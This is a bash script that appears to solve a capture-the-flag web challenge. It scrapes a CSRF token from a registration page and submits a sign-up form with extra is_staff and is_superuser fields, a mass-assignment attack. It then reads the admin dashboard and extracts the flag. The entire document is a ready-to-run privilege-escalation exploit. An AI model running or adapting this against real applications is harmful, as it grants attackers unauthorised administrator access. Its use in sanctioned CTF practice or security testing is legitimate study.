#!/usr/bin/env bash
set -euo pipefail

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  printf 'Usage: %s [base_url]\n' "$0"
  printf 'Optional: set OVERQUALIFIED_EVIDENCE_DIR=assets to save HTML evidence.\n'
  exit 0
fi

base_url="${1:-https://ce2f3697ec2f4faa.chal.ctf.ae}"
tmpdir="$(mktemp -d)"
trap 'rm -rf "$tmpdir"' EXIT

cookies="$tmpdir/cookies.txt"
register_html="$tmpdir/register.html"
register_response="$tmpdir/register-response.txt"
dashboard_html="$tmpdir/dashboard.html"
admin_html="$tmpdir/admin-dashboard.html"

username="overq_$(date +%s)_${RANDOM}"
email="${username}@nexacorp.internal"
password="Aa1!overqualified"

curl -k -sS \
  -c "$cookies" \
  -o "$register_html" \
  "${base_url%/}/register/"

csrf="$(
  grep -o 'name="csrfmiddlewaretoken" value="[^"]*"' "$register_html" \
    | head -n 1 \
    | sed 's/.*value="//; s/"$//'
)"

if [ -z "$csrf" ]; then
  printf 'Could not extract CSRF token from /register/.\n' >&2
  exit 1
fi

curl -k -sS -i \
  -b "$cookies" \
  -c "$cookies" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: ${base_url%/}/register/" \
  --data-urlencode "csrfmiddlewaretoken=${csrf}" \
  --data-urlencode "username=${username}" \
  --data-urlencode "email=${email}" \
  --data-urlencode "password=${password}" \
  --data-urlencode "password_confirm=${password}" \
  --data-urlencode "is_staff=on" \
  --data-urlencode "is_superuser=on" \
  -o "$register_response" \
  "${base_url%/}/register/"

curl -k -sS \
  -b "$cookies" \
  -o "$dashboard_html" \
  "${base_url%/}/dashboard/"

curl -k -sS \
  -b "$cookies" \
  -o "$admin_html" \
  "${base_url%/}/admin/dashboard/"

if [ -n "${OVERQUALIFIED_EVIDENCE_DIR:-}" ]; then
  mkdir -p "$OVERQUALIFIED_EVIDENCE_DIR"
  cp "$register_html" "$OVERQUALIFIED_EVIDENCE_DIR/register.html"
  cp "$register_response" "$OVERQUALIFIED_EVIDENCE_DIR/register-response.txt"
  cp "$dashboard_html" "$OVERQUALIFIED_EVIDENCE_DIR/dashboard.html"
  cp "$admin_html" "$OVERQUALIFIED_EVIDENCE_DIR/admin-dashboard.html"
fi

flag="$(grep -o 'flag{[^}]*}' "$admin_html" | head -n 1 || true)"
if [ -n "$flag" ]; then
  printf '%s\n' "$flag"
else
  printf 'No flag found. Admin dashboard response saved at: %s\n' "$admin_html" >&2
  exit 1
fi
